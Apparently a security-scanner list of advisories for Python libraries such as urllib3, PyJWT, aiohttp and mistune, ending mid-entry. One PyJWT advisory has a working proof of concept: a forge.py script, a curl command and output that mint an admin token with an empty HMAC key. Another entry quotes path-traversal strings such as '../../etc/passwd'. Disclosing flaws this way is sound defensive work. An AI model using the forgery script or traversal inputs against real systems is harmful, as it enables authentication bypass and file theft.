vulnerabilities.Title: pyasn1: pyasn1: Denial of Service via crafted ASN.1 REAL values
vulnerabilities.Description: pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the univ.Real type converted its mantissa, base, and exponent value to a Python float using exact big-integer exponentiation. A BER, CER, or DER encoded REAL value only a few bytes long can carry a very large exponent, causing float conversion through prettyPrint(), str(), comparison, arithmetic, int(), or an explicit float() call to consume excessive CPU and memory and hang applications that decode untrusted ASN.1 data and then print, log, or compare decoded objects. This issue is fixed in version 0.6.4.

vulnerabilities.Title: urllib3: urllib3: Information disclosure via cross-origin redirects forwarding sensitive headers
vulnerabilities.Description: urllib3 is an HTTP client library for Python. From 1.23 to before 2.7.0, cross-origin redirects followed from the low-level API via ProxyManager.connection_from_url().urlopen(..., assert_same_host=False) still forward these sensitive headers. This vulnerability is fixed in 2.7.0.

vulnerabilities.Title: urllib3: urllib3: Denial of Service due to excessive HTTP response decompression
vulnerabilities.Description: urllib3 is an HTTP client library for Python. From 2.6.0 to before 2.7.0, urllib3 could decompress the whole response instead of the requested portion (1) during the second HTTPResponse.read(amt=N) call when the response was decompressed using the official Brotli library or (2) when HTTPResponse.drain_conn() was called after the response had been read and decompressed partially (compression algorithm did not matter here). These issues could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This could result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data) on the client side. This vulnerability is fixed in 2.7.0.

vulnerabilities.Title: urllib3: urllib3: Traffic interception via HTTPS proxy TLS configuration override
vulnerabilities.Description: urllib3 is an HTTP client library for Python. From 1.26.0 until 2.8.0, the proxy_ssl_context, proxy_assert_hostname, proxy_assert_fingerprint, ssl_context, cert_reqs, verify_mode, use_forwarding_for_https=True, and CERT_NONE configuration paths fail to remain separated because target-server TLS settings are incorrectly applied to the HTTPS proxy connection. The trigger is that an application uses an HTTPS proxy and configures target-server TLS settings that must remain separate from the proxy TLS handshake, including HTTPS forwarding with target-specific identity or credentials. Applying cert_reqs=CERT_NONE can overwrite proxy_ssl_context.verify_mode in place, and the mutation persists so later connections reusing the same context may connect to the HTTPS proxy without certificate verification. The attack mechanism is that an attacker intercepts and impersonates the HTTPS proxy after the effective proxy policy accepts the attacker's certificate. The impact is that the attacker can observe or modify forwarded traffic or receive a target TLS client certificate, while CONNECT tunneling still preserves the separate end-to-end target TLS connection. This issue is fixed in version 2.8.0.

vulnerabilities.Title: urllib3: urllib3: Denial of Service via unbounded memory allocation in chunk parser
vulnerabilities.Description: urllib3 is an HTTP client library for Python. From 1.10.3 until 2.8.0, the HTTPResponse.read_chunked and HTTPResponse.stream methods can allocate unbounded memory because the streaming chunk parser buffers the chunk-size field until newline or EOF without a length bound. The trigger is that a malicious server returns Transfer-Encoding: chunked followed by a very long run of bytes without a newline. The attack mechanism is that a malicious HTTP server sends a very long unterminated chunk-size line. The impact is that unbounded memory allocation can exhaust the client process. This issue is fixed in version 2.8.0.

vulnerabilities.Title: brotli: Out-of-Bounds Write in Google Brotli Decoder
vulnerabilities.Description:
A buffer overflow vulnerability in the Brotli decoder (c/dec/decode.c) in Google Brotli versions 1.0.3 through 1.2.0 on all platforms allows a remote unauthenticated attacker to corrupt adjacent decoder state memory, disclose sensitive memory contents, cause a denial of service, or potentially execute arbitrary code using a crafted Brotli-compressed stream.





Users need to update any Brotli libraries or binaries between 1.0.3 through 1.2.0 to the latest available version: 1.0.10 or 1.1.1 or 1.2.1.

vulnerabilities.Title: Scrapy: python-scrapy: brotli: Python brotli decompression bomb DoS
vulnerabilities.Description: Scrapy versions up to 2.13.2 are vulnerable to a denial of service (DoS) attack due to a flaw in its brotli decompression implementation. The protection mechanism against decompression bombs fails to mitigate the brotli variant, allowing remote servers to crash clients with less than 80GB of available memory. This occurs because brotli can achieve extremely high compression ratios for zero-filled data, leading to excessive memory consumption during decompression.

vulnerabilities.Title: pyjwt: PyJWT: Authentication bypass via improper public key validation
vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, is_pem_format in jwt/utils.py is affected because is_pem_format does not recognize every PEM representation accepted by the cryptography loader. This occurs when an application mixes HMAC and asymmetric algorithms and supplies a mutated public-key PEM as raw key bytes. As a result, HMACAlgorithm.prepare_key treats the unrecognized asymmetric public key as an HMAC secret. Consequently, an attacker who knows the public key can forge authenticated HMAC tokens. This issue is fixed in version 2.14.0.

vulnerabilities.Title: pyjwt: pyjwt: Verification key substitution via unvalidated JWKS redirects
vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT PyJWKClient is affected because redirect destinations are not revalidated against the JWKS trust boundary. This occurs when a configured trusted JWKS endpoint returns an attacker-influenced redirect. As a result, PyJWKClient follows the redirect and consumes the redirected response as key material. Consequently, forwarded credentials may be disclosed or verification keys may be substituted. This issue is fixed in version 2.14.0.

vulnerabilities.Title: pyjwt: PyJWT: Authentication bypass via acceptance of DER public keys as HMAC secrets
vulnerabilities.Description: PyJWT is a Python implementation of JSON Web Token standards. From 2.4.0 until 2.14.0, PyJWT HMACAlgorithm.prepare_key is affected because asymmetric-key guard relies on textual markers that are absent from DER encoding. This occurs when an application mixes HMAC and asymmetric algorithms and supplies a DER public key as the shared verification key. As a result, PyJWT uses public DER bytes as an HMAC secret. Consequently, an attacker who knows the public key can forge authenticated HMAC tokens. This issue is fixed in version 2.14.0.

vulnerabilities.Title: pyjwt: PyJWT accepts unknown `crit` header extensions (RFC 7515 §4.1.11 MUST violation)
vulnerabilities.Description: PyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC. This vulnerability is fixed in 2.12.0.

vulnerabilities.Title: python-pyjwt: PyJWT: Authentication bypass due to forged JSON Web Tokens
vulnerabilities.Description: PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, when the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm. This vulnerability is fixed in 2.13.0.

vulnerabilities.Title: PyJWT: HS256/384/512 verify accepts empty HMAC key via oct JWK (PyJWK/PyJWKClient) enabling token forgery
vulnerabilities.Description:
### Summary

`HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is
the empty string and returns a zero-length key without raising. When a token is
then verified with that key object (a `PyJWK`, or a `PyJWK` resolved by
`PyJWKSet` / `PyJWKClient`), the HMAC verifier computes
`HMAC(key=b"", signing_input)` and accepts any token an attacker forged with the
same empty key. The attacker needs no secret knowledge: they reproduce the digest
locally with an empty key and set the token's `kid` to the empty-`k` JWK.

The empty-key rejection that `HMACAlgorithm.prepare_key` performs for
string/bytes secrets (added in 2.13.0) was never propagated to the sibling
`from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under
default decode options this path only emits an `InsecureKeyLengthWarning`, not an
error, so verification still succeeds. This is the same "empty/nil HMAC key is
accepted by verify" defect the JWT ecosystem is currently closing library-side:
fast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a
library-side reject-empty-HMAC-key precondition.

### Affected versions

`PyJWT` (PyPI package `pyjwt`) `<= 2.13.0`, current `master` at commit
`7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is
already guarded in 2.13.0; the JWK/JWKS path is not.

### Privilege required

Unauthenticated. Any party who can reach a JWT-verifying endpoint of an
application that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct
key has an empty `k` can forge tokens with arbitrary claims.

Preconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct
entry carries an empty `k`. This occurs when the signing secret is sourced from
an unset environment variable / unset config row / key-finder fallback that
base64url-encodes `b""` into the published JWKS, or when the application trusts a
JWKS containing such an entry. The equivalent unset-secret case for the
string-secret API (`jwt.decode(token, key="")`) is already rejected in 2.13.0;
the JWK route is the remaining reachable surface for the same misconfiguration.

### Vulnerable code

`jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):

```python
@staticmethod
def from_jwk(jwk: str | JWKDict) -> bytes:
    try:
        if isinstance(jwk, str):
            obj: JWKDict = json.loads(jwk)
        elif isinstance(jwk, dict):
            obj = jwk
        else:
            raise ValueError
    except ValueError:
        raise InvalidKeyError("Key is not valid JSON") from None

    if obj.get("kty") != "oct":
        raise InvalidKeyError("Not an HMAC key")

    return base64url_decode(obj["k"])   # <-- empty k -> b"", no rejection
```

Contrast the sibling `prepare_key`, which DID get the guard (lines 325-329):

```python
def prepare_key(self, key: str | bytes) -> bytes:
    key_bytes = force_bytes(key)

    if len(key_bytes) == 0:
        raise InvalidKeyError("HMAC key must not be empty.")
```

In `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key
material directly, bypassing `prepare_key`, and the length warning is non-fatal
by default:

```python
        if isinstance(key, PyJWK):
            if alg != key.algorithm_name:
                raise InvalidAlgorithmError(
                    f"Token algorithm {alg!r} does not match the key's "
                    f"algorithm {key.algorithm_name!r}"
                )
            alg_obj = key.Algorithm
            prepared_key = key.key            # from_jwk output (b""), prepare_key not run
        else:
            try:
                alg_obj = self.get_algorithm_by_name(alg)
            except NotImplementedError as e:
                raise InvalidAlgorithmError("Algorithm not supported") from e
            prepared_key = alg_obj.prepare_key(key)

        key_length_msg = alg_obj.check_key_length(prepared_key)
        if key_length_msg:
            if effective_options.get("enforce_minimum_key_length", False):
                raise InvalidKeyError(key_length_msg)
            else:
                warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only

        if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b"" succeeds
            raise InvalidSignatureError("Signature verification failed")
```

`PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a
`{"kty":"oct","k":""}` JWK yields `PyJWK.key == b""`. `PyJWKSet` and
`PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the
JWKS-over-HTTP resolution route is affected identically.

The 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM
hardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix
(GHSA-jq35-7prp-9v3f), and the test suite has
`test_hmac_prepare_key_rejects_empty_key` plus
`test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty
JSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the
untested sibling path this report closes.

### How the attacker input reaches the sink

An unauthenticated HTTP client controls the bearer token entirely: its `kid`
selects the empty-`k` oct JWK, and its signature is computed locally with the
empty key. The token flows request header -> `PyJWKClient.get_signing_key_from_jwt`
(kid resolution against the trusted JWKS) -> `jwt.decode` with the resolved
`PyJWK` -> `_verify_signature` -> `HMACAlgorithm.verify(signing_input, b"", sig)`.
No secret,
credential, or prior session is required; the only server-side precondition is a
JWKS oct entry with an empty `k`, which the "unset signing secret" configuration
produces. This is the identical trust boundary the string-secret path already
guards.

### Proof of concept

### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)

Two services model a standard OIDC-style deployment: an auth service publishing a
JWKS, and a protected resource server validating bearer tokens against that JWKS
with PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret
is sourced from an unset env var (`SIGNING_SECRET` unset -> `""`), so the
published oct JWK carries `k == ""`.

`idp.py` (auth service):

```python
import os, base64
from flask import Flask, jsonify
app = Flask(__name__)
SIGNING_SECRET = os.environ.get("SIGNING_SECRET", "")   # UNSET at runtime -> ""
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

@app.route("/.well-known/jwks.json")
def jwks():
    return jsonify({"keys": [{
        "kty": "oct", "use": "sig", "alg": "HS256",
        "kid": "auth-signing-2026",
        "k": b64u(SIGNING_SECRET.encode()),   # empty secret -> k == ""
    }]})

if __name__ == "__main__":
    app.run(port=9101)
```

`api.py` (protected resource server):

```python
from flask import Flask, request, jsonify
import jwt
from jwt import PyJWKClient
app = Flask(__name__)
jwks_client = PyJWKClient("http://127.0.0.1:9101/.well-known/jwks.json")

def authenticate():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return None, "missing bearer token"
    token = auth.split(" ", 1)[1]
    try:
        signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid
        claims = jwt.decode(token, signing_key, algorithms=["HS256", "RS256"])
    except Exception as e:
        return None, "invalid token: %s" % type(e).__name__
    return claims, None

@app.route("/api/admin/users")
def admin_users():
    claims, err = authenticate()
    if err:
        return jsonify({"error": err}), 401
    if claims.get("role") != "admin":
        return jsonify({"error": "forbidden"}), 403
    return jsonify({"ok": True, "action": "list_all_users",
                    "as_user": claims.get("sub"), "role": claims.get("role")})

if __name__ == "__main__":
    app.run(port=9102)
```

`forge.py` (attacker; no secret knowledge):

```python
import hmac, hashlib, base64, json, sys
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
header={"alg":"HS256","typ":"JWT","kid":"auth-signing-2026"}
payload={"sub":"attacker@evil.example","role":"admin"}
si=b64u(json.dumps(header,separators=(',',':')).encode())+"."+b64u(json.dumps(payload,separators=(',',':')).encode())
key = sys.argv[1].encode() if len(sys.argv)>1 else b""   # empty key
sig=hmac.new(key, si.encode(), hashlib.sha256).digest()
print(si+"."+b64u(sig))
```

Run:

```bash
python -m venv v && ./v/bin/pip install "PyJWT==2.13.0" flask
( SIGNING_SECRET= ./v/bin/python idp.py & ) ; ./v/bin/python api.py &
FORGED=$(./v/bin/python forge.py "")
curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:9102/api/admin/users
```

Verbatim run (attack, both negative controls, sanity, and patched-build re-run):

```
### PyJWT version
2.13.0

### JWKS published by the auth service (note the empty "k"):
{"keys":[{"alg":"HS256","k":"","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}

### Baseline: unauthenticated request to admin endpoint
HTTP 401

### ATTACK: attacker forges HS256 admin token signed with the EMPTY key
forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ
response:
{"action":"list_all_users","as_user":"attacker@evil.example","ok":true,"role":"admin"}
  <-- HTTP 200

### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -> reject
{"error":"invalid token: InvalidSignatureError"}
  <-- HTTP 401

### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail
JWKS now has non-empty k:
{"keys":[{"alg":"HS256","k":"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}
{"error":"invalid token: InvalidSignatureError"}
  <-- HTTP 401

### Sanity: a legitimately-signed token with the real secret is accepted
{"action":"list_all_users","as_user":"attacker@evil.example","ok":true,"role":"admin"}
  <-- HTTP 200

### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -> now rejected
JWKS (empty k, vulnerable config):
{"keys":[{"alg":"HS256","k":"","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}
{"error":"invalid token: PyJWKSetError"}
  <-- HTTP 401
```

The attack returns HTTP 200 with `role:admin` from an unauthenticated forged
token. Both negative controls (wrong non-empty key; real non-empty secret at the
auth service) return 401, isolating the defect to empty-key acceptance. The
patched build (the `from_jwk` fix below) rejects the forgery.

### Impact

- Unauthenticated authentication bypass / token forgery: an attacker mints tokens
  with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,
  yielding full impersonation and privilege escalation on any endpoint gated by
  such tokens.
- Reachable through the documented JWKS verification API
  (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.
- Triggered by the common "unset signing secret" misconfiguration that the
  string-secret path already rejects in 2.13.0, leaving the JWK path as an
  asymmetric gap.

### Suggested fix

Reject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that
`prepare_key` already applies:

```python
if obj.get("kty") != "oct":
    raise InvalidKeyError("Not an HMAC key")

key_bytes = base64url_decode(obj["k"])
if len(key_bytes) == 0:
    raise InvalidKeyError("HMAC key must not be empty.")
return key_bytes
```

This reuses the exact error message and length check the string/bytes path uses,
so both HMAC key-loading routes enforce the same invariant. A regression test for
the empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.

### Fix PR

https://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory
temp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,
DCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,
`test_api_jwk.py`, `test_api_jws.py` pass).

### Credit

Reported by tonghuaroot.

> Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

vulnerabilities.Title: aiohttp: AIOHTTP's HTTP Parser auto_decompress feature is vulnerable to zip bomb
vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Versions 3.13.2 and below allow a zip bomb to be used to execute a DoS against the AIOHTTP server. An attacker may be able to send a compressed request that when decompressed by AIOHTTP could exhaust the host's memory. This issue is fixed in version 3.13.3.

vulnerabilities.Title: aiohttp: aiohttp: Denial of Service via missing initial request timeout
vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.4, keepalive timeout handling is absent during the initial portion of a request. An attacker can keep an idle connection open indefinitely before sending any request data, consuming server connection capacity. This issue is fixed in version 3.14.4.

vulnerabilities.Title: aiohttp: aiohttp: Denial of Service via file descriptor exhaustion in multipart request processing
vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. From 2.0.0 until 3.14.4, multipart request processing can retain an unbounded number of open file descriptors. An unauthenticated attacker can consequently exhaust file descriptors with specially crafted multipart requests when a handler uses Request.post(). This issue is fixed in version 3.14.4.

vulnerabilities.Title: aiohttp: AIOHTTP: Denial of Service via malformed HTTP responses
vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.3, an out-of-bounds heap read could occur in the C response parser while building an error message for a malformed response. An attacker controlled server, or possibly an accidental response, could trigger a DoS in the client. The vulnerable path was error message construction in aiohttp/_http_parser.pyx, where an llhttp error-position pointer was used to build a snippet for malformed chunked responses and malformed request or response bytes at the buffer end. This issue is fixed in version 3.14.3.

vulnerabilities.Title: aiohttp: Multiple instances of excessive or unbounded memory/CPU use
vulnerabilities.Description:
### Summary

Multiple cases were found where aiohttp could use excessive or unbounded memory, or excessive CPU consumption on attacker controlled requests.

### Impact

An attacker could cause resource exhaustion through specially crafted requests.

vulnerabilities.Title: Black: GitHub Action installs unvalidated required-version from pyproject.toml
vulnerabilities.Description:
### Summary

The GitHub Action bundled with Black can read the version from `tool.black.required-version` if `use_pyproject` is set to True. This version is not validated and therefore can be used to execute untrusted code in the context of a victim's repository.

### Details

This is similar to the previous CVE-2026-31900. The value in `tool.black.required-version` is accepted as the version to be installed by the action without validation.

### Proof of concept

Reproduction requires a victim to use Black's GitHub Action with `use_pyproject: true`. The attacker would then issue a PR to the victim's repository with `pyproject.toml` edited so that Black points to a malicious repository.

### Impact

This is a remote code execution vulnerability impacting users using the GitHub Action bundled with psf/black and using the `use_pyproject: true` setting.

vulnerabilities.Title: black: Black: Arbitrary file writes from unsanitized user input in cache file name
vulnerabilities.Description: Black is the uncompromising Python code formatter. Starting in version 24.3.0 and prior to version 26.3.1, Black writes a cache file, the name of which is computed from various formatting options. The value of the --python-cell-magics option was placed in the filename without sanitization, which allowed an attacker who controls the value of this argument to write cache files to arbitrary file system locations. Fixed in Black 26.3.1.

vulnerabilities.Title: certifi bundles emSign root CAs with compromised intermediate CA keys
vulnerabilities.Description:
Certifi versions before 2026.10.18 include the `emSign ECC Root CA - G3` root certificate in their bundled CA store. Eight eMudhra intermediate CA certificates that chain to this root have compromised private keys and the CA has revoked them. 

An attacker with one of the compromised keys can issue valid-looking certificates for any hostname. If the attacker is also on-path, they can intercept or modify TLS traffic from clients that trust the certifi bundle. Examples include `requests`, `urllib3` and `pip`, and the Python.org macOS installer.

Certifi 2026.10.18 removed all emSign roots from the bundle. Certifi 2026.10.19 restored the emSign roots that are not affected. Upgrade to 2026.10.19 or later, and rebuild container images that vendor certifi.

vulnerabilities.Title: cryptography: cryptography Subgroup Attack Due to Missing Subgroup Validation for SECT Curves
vulnerabilities.Description: cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. Prior to 46.0.5, the public_key_from_numbers (or EllipticCurvePublicNumbers.public_key()), EllipticCurvePublicNumbers.public_key(), load_der_public_key() and load_pem_public_key() functions do not verify that the point belongs to the expected prime-order subgroup of the curve. This missing validation allows an attacker to provide a public key point P from a small-order subgroup. This can lead to security issues in various situations, such as the most commonly used signature verification (ECDSA) and shared key negotiation (ECDH). When the victim computes the shared secret as S = [victim_private_key]P via ECDH, this leaks information about victim_private_key mod (small_subgroup_order). For curves with cofactor > 1, this reveals the least significant bits of the private key. When these weak public keys are used in ECDSA , it's easy to forge signatures on the small subgroup. Only SECT curves are impacted by this. This vulnerability is fixed in 46.0.5.

vulnerabilities.Title: python-cryptography: python-cryptography: PKCS#7 EnvelopedData decryption exposes a Bleichenbacher oracle through distinguishable errors and timing
vulnerabilities.Description: cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. From 44.0.0 until 50.0.0, pkcs7_decrypt_der, pkcs7_decrypt_pem, and pkcs7_decrypt_smime reported the outcome of decrypting a RecipientInfo's encryptedKey in several distinguishable ways, one of which disclosed the exact length recovered from the RSA operation. The same distinction was also observable by timing. An application that decrypts attacker-supplied EnvelopedData and reflects the outcome gives the attacker a Bleichenbacher oracle against the content-encryption key. Decryption ran as RSA PKCS#1 v1.5 decrypt of encryptedKey, build an AES cipher from the result, then AES-CBC decrypt and PKCS#7 unpad. Invalid RSA padding, a valid padding with a bad key length, a correct length with a wrong key, and the real key each failed or succeeded differently. Case 1 is reachable only where the linked library lacks implicit rejection: OpenSSL 3.0 and 3.1, LibreSSL, and BoringSSL. Exploitation requires a service that auto-decrypts untrusted EnvelopedData matching the victim certificate and answers adaptively at high volume, such as an S/MIME gateway or mail filter. This issue is fixed in 50.0.0.

vulnerabilities.Title: python-cryptography: python-cryptography: Duplicate self-signed intermediates can cause exponential path-building
vulnerabilities.Description: python-cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. In versions 42.0.0 through 48.0.0, when resolving invalid certificate chains that include duplicate copies of self-signed certificates, the processing recursively invokes the same candidate, leading to an exponential blowup. Although the limitation that the chain depth cannot exceed a specified maximum depth prevents unbounded recursion and guarantees termination, an attacker-controlled certificate chain can lead the processing to easily take more than 5s to reject in testing. This amplification could form the basis for a resource exhaustion denial of service attack. The core issue arises in the recursive nature of build_chain_inner, which does not de-duplicate against previously analyzed candidates. As the correctness of validation is not affected, the integrity of a system cannot be compromised through this vector, only its availability. This issue is fixed in 49.0.0.

vulnerabilities.Title: Vulnerable OpenSSL included in cryptography wheels
vulnerabilities.Description:
pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in wheels prior to cryptograph 48.01 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20260609.txt.

If you are building cryptography source ("sdist") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.

vulnerabilities.Title: jaraco.context: jaraco.context: Path traversal via malicious tar archives
vulnerabilities.Description: jaraco.context, an open-source software package that provides some useful decorators and context managers, has a Zip Slip path traversal vulnerability in the `jaraco.context.tarball()` function starting in version 5.2.0 and prior to version 6.1.0. The vulnerability may allow attackers to extract files outside the intended extraction directory when malicious tar archives are processed. The strip_first_component filter splits the path on the first `/` and extracts the second component, while allowing `../` sequences. Paths like `dummy_dir/../../etc/passwd` become `../../etc/passwd`. Note that this suffers from a nested tarball attack as well with multi-level tar files such as `dummy_dir/inner.tar.gz`, where the inner.tar.gz includes a traversal `dummy_dir/../../config/.env` that also gets translated to `../../config/.env`. Version 6.1.0 contains a patch for the issue.

vulnerabilities.Title: joserfc: joserfc: Denial of Service via unbounded recipient processing during JWE decryption
vulnerabilities.Description: joserfc is a Python library that provides an implementation of several JSON Object Signing and Encryption (JOSE) standards. Prior to 1.7.5, joserfc.jwe.decrypt_json() accepts a JWE General JSON Serialization recipients array without a count limit and calls decrypt_cek() for every entry. An unauthenticated attacker who can submit a JWE to an endpoint using an RSA key-management algorithm can choose the number of private-key decryption operations performed by one request. The verify_all_recipients option does not reduce this work because the affected loop processes every recipient before consulting that setting, allowing repeated requests to exhaust service CPU without affecting confidentiality or integrity. This issue is fixed in version 1.7.5.

vulnerabilities.Title: joserfc is a Python library that provides an implementation of several ...
vulnerabilities.Description: joserfc is a Python library that provides an implementation of several JSON Object Signing and Encryption (JOSE) standards. In 1.6.2 and earlier, a resource exhaustion vulnerability in joserfc allows an unauthenticated attacker to cause a Denial of Service (DoS) via CPU exhaustion. When the library decrypts a JSON Web Encryption (JWE) token using Password-Based Encryption (PBES2) algorithms, it reads the p2c (PBES2 Count) parameter directly from the token's protected header. This parameter defines the number of iterations for the PBKDF2 key derivation function. Because joserfc does not validate or bound this value, an attacker can specify an extremely large iteration count (e.g., 2^31 - 1), forcing the server to expend massive CPU resources processing a single token. This vulnerability exists at the JWA layer and impacts all high-level JWE and JWT decryption interfaces if PBES2 algorithms are allowed by the application's policy.

vulnerabilities.Title: joserfc: joserfc: Integrity bypass via forged HMAC-signed tokens
vulnerabilities.Description: joserfc is a Python library that provides an implementation of several JSON Object Signing and Encryption (JOSE) standards. Prior to 1.6.8, joserfc.jwt.decode accepts attacker-forged HMAC-signed tokens when the caller-supplied verification key is the empty string or None, because HMACAlgorithm.sign and HMACAlgorithm.verify in src/joserfc/_rfc7518/jws_algs.py pass the output of OctKey.get_op_key(...) to hmac.new(...) and OctKey.import_key in src/joserfc/_rfc7518/oct_key.py only emits a SecurityWarning for keys shorter than 14 bytes without rejecting zero-length input. This issue is fixed in version 1.6.8.

vulnerabilities.Title: lxml: python: lxml: Information disclosure via untrusted XML input leading to local file read
vulnerabilities.Description: lxml is a library for processing XML and HTML in the Python language. Prior to 6.1.0, using either of the two parsers in the default configuration (with resolve_entities=True) allows untrusted XML input to read local files. Setting the resolve_entities option explicitly to resolve_entities='internal' or resolve_entities=False disables the local file access. This vulnerability is fixed in 6.1.0.

vulnerabilities.Title: mistune: mistune: Arbitrary file read via path traversal in Include directive
vulnerabilities.Description: Mistune before 3.3.0 contains a path traversal vulnerability in the Include directive that allows attackers to read arbitrary files by supplying ../ sequences in include paths. Attackers can also inject HTML through unescaped error messages and included file contents to perform cross-site scripting even when escape=True is set.

vulnerabilities.Title: mistune: Mistune: Regular Expression Denial of Service (ReDoS) via crafted Markdown input
vulnerabilities.Description: In versions 3.0.0a1 through 3.2.0 of Mistune, there is a ReDoS (Regular Expression Denial of Service) vulnerability in `LINK_TITLE_RE` that allows an attacker who can supply Markdown for parsing to cause denial of service. The regular expression used for parsing link titles contains overlapping alternatives that can trigger catastrophic backtracking. In both the double-quoted and single-quoted branches, a backslash followed by punctuation can be matched either as an escaped punctuation sequence or as two ordinary characters, creating an ambiguous pattern inside a repeated group. If an attacker supplies Markdown containing repeated ! sequences with no closing quote, the regex engine explores an exponential number of backtracking paths. This is reachable through normal Markdown parsing of inline links and block link reference definitions. A small crafted input can therefore cause significant CPU consumption and make applications using Mistune unresponsive.

vulnerabilities.Title: Mistune: Mistune: Denial of Service via crafted Markdown input
vulnerabilities.Description: Mistune is a Python Markdown parser with renderers and plugins. Prior to 3.3.0, Mistune is vulnerable to a CPU exhaustion DoS due to superlinear (approximately O(n²)) behavior in parse_link_text. When parsing Markdown containing many consecutive [ characters, parse_link_text repeatedly scans the input using a regex search inside a loop. Each iteration re-scans a large portion of the remaining string, resulting in quadratic-time behavior. An attacker-controlled Markdown input can therefore trigger excessive CPU usage with a very small payload. This vulnerability is fixed in 3.3.0.

vulnerabilities.Title: mistune: Mistune: Denial of Service via crafted input
vulnerabilities.Description: Mistune is a Python Markdown parser with renderers and plugins. Prior to 3.3.0, a run of closed tilde, equals-sign, or caret marker pairs around a character causes quadratic work in src/mistune/plugins/formatting.py when the strikethrough, mark, or insert plugin scans for matching markers from each possible start position, allowing denial of service through CPU exhaustion. This issue is fixed in version 3.3.0.

vulnerabilities.Title: mistune: Mistune: Denial of Service via crafted Markdown input
